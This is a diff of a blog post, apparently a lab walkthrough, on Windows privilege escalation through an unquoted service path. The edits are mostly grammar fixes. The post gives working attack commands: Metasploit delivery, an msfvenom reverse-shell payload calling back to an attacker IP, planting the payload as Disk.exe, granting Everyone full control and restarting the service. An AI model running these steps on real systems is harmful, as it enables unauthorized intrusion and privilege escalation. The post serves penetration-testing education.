@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "\/posts\/unquoted-service-path-windows-escalation\/"
-        },"genre": "posts","keywords": "Red Team, Windows","wordcount":  732 ,
+        },"genre": "posts","keywords": "Red Team, Windows","wordcount":  707 ,
         "url": "\/posts\/unquoted-service-path-windows-escalation\/","datePublished": "2023-07-04T00:00:00+00:00","dateModified": "2023-07-04T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -69,7 +69,7 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Unquoted Service Path - Windows Escalation</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/tryhardnguyen" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nguyen Nguyen</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Penetration Testing</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;732 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-07-04">2023-07-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;707 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -114,7 +114,7 @@
 	        }
 </style>
 <h2 id="background-information">Background Information:</h2>
-<p>Unquoted Service Path occurs when the path to the executable (that the service used) is misinterpreted by Service Control Manager due to the spaces and lack of &quot;&quot; (quotation mark) surrounding the path.</p>
+<p>An unquoted Service Path occurs when Service Control Manager misinterprets the Path to the executable (that the service used) due to the spaces and lack of &quot;&quot; (quotation mark) surrounding the Path.</p>
 <p>Here are some of the following examples:
 <br>
 Proper executable Path:
@@ -128,19 +128,19 @@ Why are spaces and quotation mark a big deal?
 When you send a command, spaces are used as argument separators unless they are part of a quoted string.</p>
 <p>Here is how a service control manager would evaluate a binary path:
 <br>
-We will use this as our example: <code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</code></p>
+We will use this as our example: <code>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe.</code></p>
 <ol>
-	<li>First, SCM will look for: C:\MyPrograms\Disk.exe with argument of Sorter and Enterprise\bin\disksrs.exe. If it can't find Disk.exe, then it moves on to step two.
+	<li>First, SCM will look for: C:\MyPrograms\Disk.exe with argument of Sorter and Enterprise\bin\disksrs.exe. If it can't find Disk.exe, it moves to step two.
 	<br>
 	<br>
-	<li> SCM will look for: C:\MyPrograms\Disk Sorter.exe with argument of Enterprise\bin\disksrs.exe. If SCM can't find C:\MyPrograms\Disk Sorter.exe then it moves to step 3.
+	<li> SCM will look for: C:\MyPrograms\Disk Sorter.exe with argument of Enterprise\bin\disksrs.exe. If SCM can't find C:\MyPrograms\Disk Sorter.exe, then it moves to step 3.
 	<br>
 	<br>
-	<li> SCM will look for: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe. Usually that the end of the search.
+	<li> SCM will look for: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe. Usually, that is the end of the search.
 </ol>
-Thus, can you see how long we had to wait before SCM found the application? The attacker can abuse this by creating a malicious file and rename it to Disk.exe and put it in the same location. Allowing the malicious program to be running first then the legit program. Let's see it in action shall we?
+Thus, can you see how long we had to wait before SCM found the application? The attacker can abuse this by creating a malicious file, renaming it to Disk.exe, and putting it in the same location, allowing the malicious program to run first, then the legit program. Let's see it in action, shall we?
 <h2 id="demonstration">Demonstration</h2>
-<p>First, I will install this Windows Enumeration Script (winPEAS) that finds potential escalation privilege. This is the script: <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener noreffer ">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>.
+<p>First, I will install this Windows Enumeration Script (winPEAS) that finds potential escalation privileges. Here is the link to the script: <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" target="_blank" rel="noopener noreffer ">https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS</a>.
 <br>
 To deliver this script to the target windows. I will use the Web Delivery Module in Metasploit.
 <br>
@@ -148,25 +148,25 @@ To deliver this script to the target windows. I will use the Web Delivery Module
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_53.png">
 </div>
-<p>After running, Metasploit should generate a shellcode. Paste that shellcode in the Windows command line and Metasploit should be establishing a connection to the windows. Once Metasploit has establish connection with the Command Shell. We can upgrade the shell to a meterpreter using the command:
+<p>After running, Metasploit should generate a shell code. Paste that shellcode in the Windows command line, and Metasploit should establish a connection to the Windows. Once Metasploit has established a connection with the Command Shell. We can upgrade the shell to a meterpreter using the command:
 <code>sessions -u 1</code>
 <br>
 <img class="zoom" src="/images/linux_priv_54.png"></p>
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_54.png">
 </div>
-<p>Now, we will go inside sessions 2 using: <code>sessions -i 2</code>. Then begin our process of transferring the script to the target machine. The command we are going to use: <code>upload binary_path</code>.
+<p>We will go inside session two using: <code>sessions -i 2</code>. Then begin our process of transferring the script to the target machine. The command we are going to use: is: <code>upload binary_path</code>.
 <br>
 <br>
-My winPEASx64 binary is in /home/kali/Downloads. I will use this command: <code>upload /home/kali/Downloads/winPEASx64.exe</code>. Then I will spawn a shell and execute the enumeration script to see where I can perform Unquoted service path vulnerability.
+My winPEASx64 binary is in /home/kali/Downloads. I will use this command: <code>upload /home/kali/Downloads/winPEASx64.exe</code>. Then I will spawn a shell and execute the enumeration script to see where to perform Unquoted service path vulnerability.
 <br>
 <br>
 Some notes about winPEAS:
 <br>
-You can get the help (man) page using <code>.\winPEASx64.exe help</code>. This will allow you to specify the info you&rsquo;re looking for.
+You can get the help (man) page using <code>.\winPEASx64.exe help</code>. which allows you to specify the info you&rsquo;re looking for.
 <br>
 <br>
-Note: that if you don&rsquo;t specify what you&rsquo;re looking for and plain out run it, It will look for all the information listed above. Since we are going work with services, I&rsquo;m interested in servicesinfo. Let run it using <code>.\winPEASx64 servicesinfo</code> and to get it to save the output to a file so we can look at it later, at the end of the command we can do: <code>&gt; service_info.txt</code>.
+Note: if you don&rsquo;t specify what you&rsquo;re looking for and plain out run it, The script will look for all the information listed above. Since we will work with services, I&rsquo;m interested in servicesinfo. Let&rsquo;s run it using <code>.\winPEASx64 servicesinfo</code> and get it to save the output to a file so we can look at it later. At the end of the command, we can do: <code>&gt; service_info.txt</code>.
 <br>
 <br>
 Terminal version:
@@ -181,25 +181,25 @@ Terminal version:
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_55.png">
 </div>
-<p>From the terminal picture above, It say Disk Sorter Enterprise - No Quotes and Space Detected. This mean we can carry out Unquoted Service Path attack on this service. To get more further detail on a service we can run: <code>sc qc &quot;Disk Sorter Enterprise&quot;</code>
+<p>The terminal picture above says Disk Sorter Enterprise - No Quotes and Space Detected. This means we can attack Unquoted Service Path on this service. To get further detail on service, we can run: <code>sc qc &quot;Disk Sorter Enterprise&quot;</code>
 <br>
 <img class="zoom" src="/images/linux_priv_57.png"></p>
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_57.png">
 </div>
-BINARY_PATH_NAME point to the executable that the service is running and SERVICE_START_NAME point to the users. 
+BINARY_PATH_NAME point to the executable that the service is running, and SERVICE_START_NAME point to the users. 
 <br>
 <br>
-The plan is replace the binary with our malicious executable.
+The plan is to replace the binary with our malicious executable.
 <br>
 <br>
-The next step is to create a listener in our Metasploit. We can do this by the multi/handler option. I'm not going go over the steps to do that.
+The next step is to create a listener in our Metasploit. We can do this by the multi/handler option. I'm not going to go over the steps to do that.
 <br>
 <img class="zoom" src="/images/linux_priv_57.png">
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_57.png">
 </div>
-<p>Then we are going to create our malicious program which connect to our listener. For this, I am going to use MSFvenom. MSF venom is included in Kali Linux.
+<p>Then we will create our malicious program, which connects to our listener. For this, I will use MSFvenom.
 <br>
 Command: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.29.190 LPORT=6777 -f exe-service -o poison_ivy.exe</code>
 <br>
@@ -207,16 +207,17 @@ Command: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.29.190 LPORT=67
 <div class="overlay">
         <img class="zoomed-image" src="/images/linux_priv_58.png">
 </div>
-<p>Now, it time to transfer the poison_ivy.exe to the target machine using: <code>upload /home/kali/Downloads/poison_ivy.exe</code>. Once we transfer poison_ivy.exe to the machine.  We have to move to <code>C:\MyPrograms\</code>  directory and move poison_ivy.exe to here and rename the file to Disk.exe.
+<p>Now, it is time to transfer the poison_ivy.exe to the target machine using: <code>upload /home/kali/Downloads/poison_ivy.exe</code>. Once we transfer poison_ivy.exe to the machine. We have to move to <code>C:\MyPrograms\</code>  directory and move poison_ivy.exe to here and rename the file to Disk.exe.
 <br>
 <br>
-This is the command we will run: <code>move C:\Users\thm-unpriv\poison_ivy.exe Disk.exe</code>. Then grant Full Access (Everyone) - So it can be run by anyone. Using this command: <code>icalcs C:\MyPrograms\Disk.exe /grant Everyone:F</code></p>
-<p>Now, it time to restart the service by turning it off and on.
+We will run this command: <code>move C:\Users\thm-unpriv\poison_ivy.exe Disk.exe</code>. Then grant Full Access (Everyone) - So anyone can run it. Using this command: <code>icalcs C:\MyPrograms\Disk.exe /grant Everyone:F</code></p>
+<p>Now, restart the service by turning it off and on.
 <br>
 <code>sc stop &quot;disk sorter enterprise&quot;</code>
 <br>
 <code>sc start &quot;disk sorter enterprise&quot;</code>
-Then you should got a shell. Congratulations we just escalated our privilege.
+<br>
+Then you should get a shell. Congratulations, we just escalated our privilege.
 <br>
 <img class="zoom" src="/images/linux_priv_60.png"></p>
 <div class="overlay">
